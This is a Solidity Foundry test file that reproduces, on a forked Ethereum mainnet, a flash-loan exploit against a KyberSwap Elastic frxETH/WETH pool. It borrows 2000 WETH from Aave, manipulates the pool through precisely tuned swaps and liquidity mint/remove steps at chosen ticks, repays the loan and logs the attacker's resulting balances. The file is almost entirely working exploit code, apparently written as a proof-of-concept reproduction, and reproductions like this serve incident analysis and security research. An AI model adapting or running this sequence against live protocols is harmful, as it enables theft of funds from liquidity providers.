// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "./Interfaces.sol";
import "./IERC20.sol";

contract AttackContract is Test {
    address public constant ATTACKER = 0xaF2Acf3D4ab78e4c702256D214a3189A874CDC13;
    address public constant AAVE_POOL_V3 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address public constant WRAPPED_ETHER = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant FRAX_ETHER = 0x5E8422345238F34275888049021821E8E08CAa1f;
    address public constant KYBERSWAP_V2_NFT_POSITIONS_MANAGER = 0xe222fBE074A436145b255442D919E4E3A6c6a480;
    address public constant KYBERSWAP_V2_REINVESTMENT_TOKEN = 0xFd7B111AA83b9b6F547E617C7601EfD997F64703;
    address public constant KYBERSWAP_ELASTIC_ANTI_SNIPING = 0xe222fBE074A436145b255442D919E4E3A6c6a480;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETHEREUM_RPC_URL"), 18630391);
    }

    function test_executeExploit() public {
        vm.deal(address(this), 1 ether);
        Interfaces(AAVE_POOL_V3).flashLoanSimple(address(this), WRAPPED_ETHER, 2000000000000000000000, "", 0);
    }

    function executeOperation(
        address, /*asset*/
        uint256, /*amount*/
        uint256, /*premium*/
        address, /*initiator*/
        bytes calldata /*params*/
    ) external returns (bool) {
        Interfaces(FRAX_ETHER).approve(
            KYBERSWAP_V2_NFT_POSITIONS_MANAGER,
            115792089237316195423570985008687907853269984665640564039457584007913129639935
        );
        Interfaces(WRAPPED_ETHER).approve(
            KYBERSWAP_V2_NFT_POSITIONS_MANAGER,
            115792089237316195423570985008687907853269984665640564039457584007913129639935
        );
        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).getPoolState();

        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swap(
            address(this), 2000000000000000000000, false, 0x100000000000000000000000000, ""
        );

        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).tickDistance();
        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swapFeeUnits();

        (, int24 currentTick, int24 nearestCurrentTick,) = Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).getPoolState();

        int24[2] memory ticksPrevious;
        ticksPrevious[0] = nearestCurrentTick;
        ticksPrevious[1] = nearestCurrentTick;

        Interfaces.MintParams memory mintParams = Interfaces.MintParams({
            token0: FRAX_ETHER,
            token1: WRAPPED_ETHER,
            fee: 10,
            tickLower: currentTick,
            tickUpper: 111310,
            ticksPrevious: ticksPrevious,
            amount0Desired: 6948087773336076,
            amount1Desired: 107809615846697233,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: 1700693711
        });

        Interfaces(KYBERSWAP_V2_NFT_POSITIONS_MANAGER).mint(mintParams);

        Interfaces.RemoveLiquidityParams memory removeLiqParams = Interfaces.RemoveLiquidityParams({
            tokenId: 359,
            liquidity: 14938549516730950591,
            amount0Min: 0,
            amount1Min: 0,
            deadline: 1700693711
        });
        Interfaces(KYBERSWAP_V2_NFT_POSITIONS_MANAGER).removeLiquidity(removeLiqParams);

        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swap(
            address(this), 387170294533119999999, false, 1461446703485210103287273052203988822378723970341, ""
        );

        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swap(address(this), -396244493223555299358, false, 4295128740, "");

        Interfaces(WRAPPED_ETHER).approve(AAVE_POOL_V3, 2001000000000000000000);

        uint256 finalWETHBalanceOfAttacker = Interfaces(WRAPPED_ETHER).balanceOf(address(this));
        uint256 finalFRAXETHBalanceOfAttacker = Interfaces(FRAX_ETHER).balanceOf(address(this));

        console.log("Final WETH Balance: ", finalWETHBalanceOfAttacker);
        console.log("Final FRAXETH Balance: ", finalFRAXETHBalanceOfAttacker);

        console.log("DONE!");

        return true;
    }

    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata /*data*/ ) public {
        if (deltaQty0 > 0) {
            Interfaces(address(Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).token0())).transfer(
                address(KYBERSWAP_V2_REINVESTMENT_TOKEN), uint256(deltaQty0)
            );
        } else if (deltaQty1 > 0) {
            Interfaces(address(Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).token1())).transfer(
                address(KYBERSWAP_V2_REINVESTMENT_TOKEN), uint256(deltaQty1)
            );
        }
    }
}
